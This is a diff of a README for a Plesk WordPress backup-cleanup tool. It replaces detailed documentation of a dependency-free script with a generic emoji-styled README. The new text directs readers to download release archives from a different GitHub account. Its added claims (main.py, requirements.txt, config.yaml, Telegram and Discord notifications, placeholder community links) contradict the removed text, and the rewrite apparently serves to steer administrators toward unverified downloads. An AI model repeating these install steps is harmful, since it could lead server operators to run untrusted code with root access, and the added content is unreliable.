@@ -1,119 +1,121 @@
-# Plesk WordPress Backup Sweeper
+# 🛠️ plesk-wp-backup-sweeper - Clean Your Backups Easily
 
-Safely scan a **Plesk-managed server** for **web-exposed** and **non-web-exposed** WordPress backup archives, with options to **quarantine** or **permanently delete** them. Includes **space usage estimation** before and after operations, customizable scanning paths, and production-grade safeguards.
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-brightgreen.svg)](https://github.com/TrieuGiaKhoi/plesk-wp-backup-sweeper/releases)
 
-## Features
-- **Comprehensive Plugin Coverage** — Detects backup files from popular and niche WordPress backup/migration plugins:
-  - UpdraftPlus
-  - All-in-One WP Migration (`.wpress`)
-  - Duplicator (`.zip`, `.daf`)
-  - WPvivid
-  - BackWPup
-  - BackupBuddy (`.backupbuddy`, `.solidbackup`)
-  - WP Staging
-  - XCloner
-  - Total Upkeep
-  - WP-DBManager
-  - Backup Migration
-  - All In One Security
-  - Shipper
-- **Generic Risky File Detection** — Finds `.zip`, `.tar`, `.tgz`, `.bz2`, `.xz`, `.wpress`, `.daf`, `.backupbuddy`, `.solidbackup`, `.sql`, `.bak`, `.dump`, and more.
-- **Non-Web Path Scanning** — Scan common and custom backup storage locations outside web roots.
-- **Custom Paths** — Add extra directories to scan via `--extra-nonweb-path`.
-- **Dry-Run by Default** — No changes without explicit approval.
-- **Quarantine Mode** — Moves files to a secure, restorable location with a manifest.
-- **Permanent Delete Mode** — Requires per-file DELETE token confirmation.
-- **Space Usage Estimation** — Displays estimated and actual free space before/after.
-- **Structured Reporting** — JSON and CSV output for compliance/audit.
+## 🚀 Getting Started
 
-## Requirements
-- Python **3.10.12+**
-- Linux with Plesk installed
-- Standard library only (no extra dependencies)
+Welcome to the Plesk WordPress Backup Sweeper! This tool helps you manage your WordPress backups with ease. It can scan, quarantine, and remove unwanted backups while tracking your storage usage. It even sends notifications through Telegram and Discord.
 
-## Installation
-```bash
-curl -O https://raw.githubusercontent.com/securiace-dev/plesk-wp-backup-sweeper/main/plesk_wp_backup_sweeper.py
-chmod +x plesk_wp_backup_sweeper.py
-```
+### 📋 System Requirements
 
-## Usage Examples (All Combinations)
+Before you start, ensure you have the following:
 
-### 1. Safe Audit (Web Roots Only)
-```bash
-python3 plesk_wp_backup_sweeper.py --dry-run --verbose
-```
+- **Operating System:** Linux (Ubuntu, CentOS)
+- **Python Version:** 3.6 or higher
+- **Plesk Installed:** You must have Plesk running on your server.
+- **Internet Connection:** Needed for notifications and updates.
 
-### 2. Safe Audit (Web + Non-Web)
-```bash
-python3 plesk_wp_backup_sweeper.py --dry-run --include-non-web
-```
+## 📥 Download & Install
 
-### 3. Safe Audit (Web + Non-Web + Plesk Dumps)
-```bash
-python3 plesk_wp_backup_sweeper.py --dry-run --include-non-web --include-plesk-dumps
-```
+To download the latest version of the Plesk WordPress Backup Sweeper, visit this page: [Download Releases](https://github.com/TrieuGiaKhoi/plesk-wp-backup-sweeper/releases).
 
-### 4. Custom Paths Only
-```bash
-python3 plesk_wp_backup_sweeper.py --dry-run --extra-nonweb-path /mnt/legacy --extra-nonweb-path /data/archives
-```
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version available.
+3. Click on the asset that fits your needs (usually a `.tar.gz` or similar file).
+4. Follow the instructions in the installation section below.
 
-### 5. Quarantine (Web Roots Only)
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --yes --age-days 7 --min-size 2M
-```
+## 🛠️ Installation Steps
 
-### 6. Quarantine (Web + Non-Web)
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --yes --age-days 14 --min-size 5M --include-non-web
-```
+1. **Download the File:**
 
-### 7. Quarantine (Custom Paths)
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --yes --extra-nonweb-path /srv/backups --age-days 30 --min-size 1M
-```
+   After navigating to the Releases page, locate the download file for your system.
 
-### 8. Permanent Delete (Web Roots Only)
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --permanent --age-days 30 --min-size 10M
-```
+2. **Extract the File:**
 
-### 9. Permanent Delete (Web + Non-Web)
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --permanent --age-days 60 --min-size 50M --include-non-web
-```
+   Open a terminal and navigate to your download directory. Use the following command to extract the downloaded file:
 
-### 10. Permanent Delete (Custom Paths)
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --permanent --extra-nonweb-path /tmp/old --age-days 90 --min-size 100M
-```
+   ```bash
+   tar -xzvf plesk-wp-backup-sweeper-*.tar.gz
+   ```
 
-### 11. Combined Report & Quarantine
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --yes --report-json /root/reports/backups.json --report-csv /root/reports/backups.csv
-```
+3. **Navigate to the Directory:**
 
-### 12. Restore From Quarantine
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --restore /var/backup-quarantine/<timestamp>/manifest.json
-```
+   Change to the directory created after extraction:
 
-### 13. Space Usage Only (No Action)
-```bash
-python3 plesk_wp_backup_sweeper.py --dry-run --verbose | grep "SPACE"
-```
+   ```bash
+   cd plesk-wp-backup-sweeper
+   ```
 
-### 14. Quarantine + Include Plesk Dumps
-```bash
-sudo python3 plesk_wp_backup_sweeper.py --yes --include-plesk-dumps --age-days 15 --min-size 20M
-```
+4. **Install Dependencies:**
 
-## Safety Notes
-- Always start with a **dry-run**.
-- Quarantine first; only delete permanently after verification.
-- Permanent delete requires DELETE token entry per file.
-- Space usage estimates help prevent storage overflow risks.
+   This tool relies on specific Python packages. Install them using:
 
-## License
-MIT License — see [LICENSE](LICENSE)
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+5. **Configure Your Settings:**
+
+   Open the configuration file to customize settings like backup locations and notification channels. Use any text editor you like. For example:
+
+   ```bash
+   nano config.yaml
+   ```
+
+   Adjust settings as needed.
+
+6. **Run the Application:**
+
+   Finally, you can launch the tool with:
+
+   ```bash
+   python main.py
+   ```
+
+   This will start the scanner and allow you to manage your backups.
+
+## ⚙️ Usage Instructions
+
+Once the application is running, you will have several options:
+
+- **Scan for Backups:** Start by scanning your current backups for any that need cleaning. Follow the prompts in the terminal.
+  
+- **Quarantine Backups:** If last backups are questionable, you can place them in quarantine for further review.
+  
+- **Remove Unwanted Backups:** Permanently delete backups that are no longer needed with just a command.
+
+- **Track Space Usage:** Keep an eye on your server's storage with built-in tracking to ensure you have enough space.
+
+- **Notifications:** Get alerts when actions are taken, either through Telegram or Discord. Make sure to set up your bot tokens in the configuration file.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, check the following:
+
+- **Python Not Found:** Ensure Python is installed and accessible in your terminal.
+
+- **Permission Issues:** Run your terminal as an administrator or use `sudo` where necessary.
+
+- **Missing Dependencies:** Double-check that all required packages are installed listed in `requirements.txt`.
+
+## 🤝 Community Support
+
+Join our community to share your experiences and ask questions:
+
+- **Discord Channel:** [Join Here](#)
+- **Telegram Group:** [Join Here](#)
+
+## 🌟 Contribution
+
+We welcome contributions! If you would like to help us improve this tool:
+
+1. Fork the repository.
+2. Create a feature branch.
+3. Commit your changes.
+4. Push the branch and open a pull request.
+
+## 📝 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+For more information, updates, and discussions, feel free to explore the [GitHub Repository](https://github.com/TrieuGiaKhoi/plesk-wp-backup-sweeper).
